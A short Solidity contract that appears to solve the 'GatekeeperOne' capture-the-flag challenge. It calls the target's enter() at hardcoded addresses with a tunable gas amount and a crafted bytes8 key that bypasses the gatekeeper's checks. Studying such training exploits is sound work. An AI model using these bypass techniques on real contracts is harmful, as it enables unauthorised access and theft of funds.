// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IGateKeeperOne {
    function enter(bytes8) external returns (bool);
}

contract CallGateKeeperOne {
    address gateKeeperOne = 0xCf7Cbd00A0c5A9B953f045d9f91B42b8fB4A3277;
    address gateKeeperOneTest = 0xfe4531602A0035374132DE75Fb244f9dB2358e64;

    function callGateKeeperOneTest(uint256 gas, uint256 delta) public {
        IGateKeeperOne(gateKeeperOneTest).enter{gas: gas}(bytes8(uint64(delta + 2**32)));
    }

    function callGateKeeperOne(uint256 gas, uint256 delta) public {
        IGateKeeperOne(gateKeeperOne).enter{gas: gas}(bytes8(uint64(delta + 2**32)));
    }
}